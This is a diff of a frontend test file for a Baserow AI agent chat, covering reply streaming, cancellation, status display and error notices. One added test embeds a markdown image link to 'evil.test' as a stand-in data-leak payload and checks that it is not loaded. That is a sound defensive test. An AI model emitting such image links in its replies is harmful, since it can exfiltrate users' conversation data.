@@ -7,14 +7,16 @@ import {
   createAgentPage,
   deferredReply,
   destroyAgentPage,
+  editInstructions,
   message,
   messages,
   mockConversations,
   mockMessages,
   mockSendMessage,
   mockStartConversation,
+  openSection,
   page,
-  runningTurn,
+  runningReply,
   selectConversation,
   send,
   sendMessage,
@@ -24,25 +26,21 @@ import {
 
 vi.mock('@baserow/modules/core/services/chatRuns', () => ({ default: vi.fn() }))
 
-const savedTurn = (status, errorCode = '', id = 1) => ({
-  id,
-  status,
-  error_code: errorCode,
-  run_id: null,
-})
 const existingConversation = conversation(
   'conversation-a',
   'Conversation A',
   undefined,
   7
 )
-const prompt = (turn) => message('m1', 'Hello', { id: 1, turn })
-const reply = (turn, content = 'Hi there') =>
-  message('r1', content, { id: turn.id * 2, role: 'assistant', turn })
-const notice = (wrapper) => wrapper.find('.agent-chat__notice').text()
+const prompt = message('m1', 'Hello', { id: 1 })
+const reply = (status, content = 'Hi there', extra = {}) =>
+  message('reply-2', content, { id: 2, role: 'assistant', status, ...extra })
+const error = (wrapper) => wrapper.find('.chat-message__bubble--error').text()
+const note = (wrapper) => wrapper.find('.chat-message__note').text()
+const strip = (wrapper) => wrapper.get('.chat-composer__status')
 const announcement = (wrapper) =>
   wrapper.get('.agent-chat__announcement[role="status"]').text()
-const liveReply = (wrapper) => wrapper.get('.agent-chat__message[aria-live]')
+const liveReply = (wrapper) => wrapper.get('.chat-message__bubble[aria-live]')
 const loadErrorAlert = (wrapper) =>
   wrapper
     .findAll('.alert')
@@ -92,10 +90,8 @@ describe('Agent replies', () => {
   const savedReply = (status = 'completed', content = 'Hi there') => [
     200,
     page([
-      message(sentBodies(testApp)[0].message_uuid, 'Hello', {
-        turn: savedTurn(status),
-      }),
-      reply(savedTurn(status), content),
+      message(sentBodies(testApp)[0].message_uuid, 'Hello', { id: 1 }),
+      reply(status, content),
     ]),
   ]
 
@@ -106,9 +102,8 @@ describe('Agent replies', () => {
         200,
         {
           conversation: conversation(body.uuid, body.content, undefined, 5),
-          message: message(body.message_uuid, body.content, {
-            turn: runningTurn(),
-          }),
+          message: message(body.message_uuid, body.content, { id: 1 }),
+          reply: runningReply(),
         },
       ]
     })
@@ -117,7 +112,6 @@ describe('Agent replies', () => {
       .reply(refresh)
     const wrapper = await mount()
     await sendMessage(wrapper, 'Hello')
-    await streamText('run-1', 'Hel')
     return wrapper
   }
 
@@ -130,18 +124,29 @@ describe('Agent replies', () => {
       chatId: 5,
     })
     expect(api.stream.mock.calls.map(([runId]) => runId)).toEqual(['run-1'])
-    expect(messages(wrapper)).toEqual(['Hello', 'Hel'])
-    expect(
-      wrapper.findAll('.agent-chat__message-author').map((item) => item.text())
-    ).toEqual(['Ada', 'Support agent'])
-    expect(liveReply(wrapper).attributes('aria-busy')).toBe('true')
+    expect(messages(wrapper)).toEqual(['Hello'])
+    expect(wrapper.get('.chat-message__author').text()).toBe(
+      'Support agent agent.thinking'
+    )
+    expect(wrapper.get('.chat-message__avatar').text()).toBe('S')
+    expect(strip(wrapper).text()).toBe('agent.thinking')
     expect(announcement(wrapper)).toBe('agent.replying')
     expect(stop(wrapper).attributes('aria-label')).toBe('agent.stop')
+
+    await streamText('run-1', 'Hel')
+
+    expect(messages(wrapper)).toEqual(['Hello', 'Hel'])
+    expect(liveReply(wrapper).attributes('aria-busy')).toBe('true')
+    expect(wrapper.get('.chat-message__author').text()).toBe('Support agent')
+    expect(strip(wrapper).text()).toBe('agent.writing')
 
     await finish('run-1')
 
     expect(messages(wrapper)).toEqual(['Hello', 'Hel'])
     expect(liveReply(wrapper).attributes('aria-busy')).toBe('false')
+    expect(strip(wrapper).classes()).not.toContain(
+      'chat-composer__status--visible'
+    )
     expect(send(wrapper).attributes('disabled')).toBeDefined()
     expect(testApp.mock.history.get.at(-1).headers).toMatchObject({
       'X-Baserow-Realtime-Recovery': 'true',
@@ -154,12 +159,49 @@ describe('Agent replies', () => {
     expect(send(wrapper).attributes('aria-label')).toBe('agent.send')
   })
 
+  test('loads the saved reply when its run ended before the send returned', async () => {
+    api.get.mockResolvedValue({ status: 'completed', error_code: '' })
+    const wrapper = await startReply(() => savedReply())
+
+    expect(messages(wrapper)).toEqual(['Hello', 'Hi there'])
+    expect(send(wrapper).attributes('aria-label')).toBe('agent.send')
+  })
+
+  test('keeps Stop while the configuration stops being ready', async () => {
+    const wrapper = await startReply(deferredReply().reply)
+
+    await openSection(wrapper, 'agent.instructions')
+    await editInstructions(wrapper, '')
+    await stop(wrapper).trigger('click')
+    await flushPromises()
+
+    expect(api.cancel).toHaveBeenCalledExactlyOnceWith('run-1')
+  })
+
+  test('renders replies as markdown without loading images', async () => {
+    withConversation([
+      prompt,
+      reply('completed', '- **First**\n- ![leak](https://evil.test/?q=1)'),
+    ])
+    const wrapper = await mount()
+    await selectConversation(wrapper, existingConversation.title)
+
+    const markdown = wrapper.get('.chat-markdown')
+    expect(markdown.findAll('li').map((item) => item.text())).toEqual([
+      'First',
+      '!leak',
+    ])
+    expect(markdown.find('strong').text()).toBe('First')
+    expect(markdown.find('img').exists()).toBe(false)
+  })
+
   test('retains streamed text after a history failure and retries the saved outcome', async () => {
     testApp.dontFailOnErrorResponses()
     let available = false
     const wrapper = await startReply(() =>
       available ? savedReply() : [500, {}]
     )
+    await streamText('run-1', 'Hel')
 
     await finish('run-1')
 
@@ -172,7 +214,8 @@ describe('Agent replies', () => {
   })
 
   test('stops a reply and shows its persisted cancellation', async () => {
-    const wrapper = await startReply(() => savedReply('cancelled', 'Hel'))
+    const wrapper = await startReply(() => savedReply('cancelled', 'Hel!'))
+    await streamText('run-1', 'Hel')
 
     await stop(wrapper).trigger('click')
     await flushPromises()
@@ -180,15 +223,15 @@ describe('Agent replies', () => {
     expect(document.activeElement).toBe(composer(wrapper).element)
     await finish('run-1', 'cancelled')
 
-    expect(messages(wrapper)).toEqual(['Hello', 'Hel'])
-    expect(notice(wrapper)).toBe('agent.replyStopped')
+    expect(messages(wrapper)).toEqual(['Hello', 'Hel!'])
+    expect(note(wrapper)).toBe('agent.replyStopped')
     expect(announcement(wrapper)).toBe('agent.replyStopped')
   })
 
   test('follows an active reply on reload and recovers its saved outcome after logout', async () => {
     withConversation(
-      [prompt(runningTurn('run-2'))],
-      [prompt(savedTurn('completed')), reply(savedTurn('completed'))]
+      [prompt, runningReply('run-2')],
+      [prompt, reply('completed')]
     )
     let wrapper = await mount()
     await selectConversation(wrapper, existingConversation.title)
@@ -205,15 +248,21 @@ describe('Agent replies', () => {
     expect(send(wrapper).attributes('aria-label')).toBe('agent.send')
   })
 
-  test('queues a completed outcome behind the refresh started by another tab', async () => {
+  test('queues a failed outcome behind the refresh started by another tab', async () => {
     const startedRefresh = deferredReply()
-    const otherPrompt = (turn) =>
-      message('m2', 'From another tab', { id: 3, turn })
-    const completed = savedTurn('failed', 'failed', 2)
-    withConversation([prompt(savedTurn('completed'))], startedRefresh.reply, [
-      prompt(savedTurn('completed')),
-      otherPrompt(completed),
-      reply(completed, 'Partial'),
+    const otherPrompt = message('m3', 'From another tab', { id: 3 })
+    const otherReply = (status, content, extra) =>
+      message('reply-4', content, {
+        id: 4,
+        role: 'assistant',
+        status,
+        ...extra,
+      })
+    withConversation([prompt, reply('completed')], startedRefresh.reply, [
+      prompt,
+      reply('completed'),
+      otherPrompt,
+      otherReply('failed', 'Partial', { errorCode: 'failed' }),
     ])
     const wrapper = await mount()
     await selectConversation(wrapper, existingConversation.title)
@@ -228,58 +277,37 @@ describe('Agent replies', () => {
     startedRefresh.resolve(
       200,
       page([
-        prompt(savedTurn('completed')),
-        otherPrompt({ ...runningTurn('run-4'), id: 2 }),
+        prompt,
+        reply('completed'),
+        otherPrompt,
+        otherReply('running', '', { runId: 'run-4' }),
       ])
     )
     await flushPromises()
 
-    expect(messages(wrapper)).toEqual(['Hello', 'From another tab', 'Partial'])
-    expect(notice(wrapper)).toBe('agent.replyFailed')
-  })
-
-  test('orders the previous reply before a message sent as that reply ends', async () => {
-    const completed = savedTurn('completed')
-    const next = savedTurn('completed', '', 2)
-    withConversation([prompt(savedTurn('running'))], () => [
-      200,
-      page([
-        prompt(completed),
-        reply(completed),
-        message(sentBodies(testApp)[0].uuid, 'Next', { id: 3, turn: next }),
-        message('r2', 'Bye', { id: 4, role: 'assistant', turn: next }),
-      ]),
+    expect(messages(wrapper)).toEqual([
+      'Hello',
+      'Hi there',
+      'From another tab',
+      'Partial',
     ])
-    mockSendMessage(testApp, existingConversation.uuid, ({ data }) => [
-      200,
-      {
-        conversation: existingConversation,
-        message: message(JSON.parse(data).uuid, 'Next', {
-          id: 3,
-          turn: { ...runningTurn('run-2'), id: 2 },
-        }),
-      },
-    ])
-    const wrapper = await mount()
-    await selectConversation(wrapper, existingConversation.title)
-    await sendMessage(wrapper, 'Next')
-    await finish('run-2')
-
-    expect(messages(wrapper)).toEqual(['Hello', 'Hi there', 'Next', 'Bye'])
+    expect(error(wrapper)).toBe('agent.replyFailed')
   })
 
   test('follows a conflicting reply while preserving the draft and clears its refusal in another chat', async () => {
     testApp.dontFailOnErrorResponses()
-    const earlier = prompt(savedTurn('completed'))
-    const otherPrompt = (turn) =>
-      message('m2', 'Other tab', { id: 3, turn: { ...turn, id: 2 } })
+    const otherPrompt = message('m3', 'Other tab', { id: 3 })
     withConversation(
-      [earlier],
-      [earlier, otherPrompt(runningTurn('run-3'))],
+      [prompt],
+      [prompt, otherPrompt, runningReply('run-3', 4)],
       [
-        earlier,
-        otherPrompt(savedTurn('completed', '', 2)),
-        reply(savedTurn('completed', '', 2)),
+        prompt,
+        otherPrompt,
+        message('reply-4', 'Hi there', {
+          id: 4,
+          role: 'assistant',
+          status: 'completed',
+        }),
       ]
     )
     mockConversations(
@@ -317,7 +345,7 @@ describe('Agent replies', () => {
 
   test('keeps a busy refusal editable and allows retry with a new message ID', async () => {
     testApp.dontFailOnErrorResponses()
-    withConversation([prompt(savedTurn('completed'))])
+    withConversation([prompt])
     mockSendMessage(testApp, existingConversation.uuid, [
       429,
       { error: 'ERROR_AGENT_BUSY' },
@@ -338,7 +366,7 @@ describe('Agent replies', () => {
 
   test('clears a refusal if the other reply already ended before the refresh', async () => {
     testApp.dontFailOnErrorResponses()
-    withConversation([prompt(savedTurn('completed'))])
+    withConversation([prompt])
     mockSendMessage(testApp, existingConversation.uuid, [
       409,
       { error: 'ERROR_CHAT_RUN_IN_PROGRESS' },
@@ -352,19 +380,24 @@ describe('Agent replies', () => {
   })
 
   test.each([
-    ['failed', 'timeout', 'agent.replyTimedOut'],
-    ['running', '', 'agent.replyInterrupted'],
+    [
+      'failed',
+      'timeout',
+      'Partial',
+      ['Hello', 'Partial'],
+      'agent.replyTimedOut',
+    ],
+    ['running', '', '', ['Hello'], 'agent.replyInterrupted'],
   ])(
-    'shows one notice after the last message of an unsuccessful %s turn',
-    async (status, errorCode, expected) => {
-      const turn = savedTurn(status, errorCode)
-      withConversation([prompt(turn), reply(turn, 'Partial')])
+    'shows why a saved %s reply did not complete',
+    async (status, errorCode, content, expectedMessages, expected) => {
+      withConversation([prompt, reply(status, content, { errorCode })])
       const wrapper = await mount()
       await selectConversation(wrapper, existingConversation.title)
 
-      expect(messages(wrapper)).toEqual(['Hello', 'Partial'])
-      expect(wrapper.findAll('.agent-chat__notice')).toHaveLength(1)
-      expect(notice(wrapper)).toBe(expected)
+      expect(messages(wrapper)).toEqual(expectedMessages)
+      expect(wrapper.findAll('.chat-message__bubble--error')).toHaveLength(1)
+      expect(error(wrapper)).toBe(expected)
     }
   )
 })
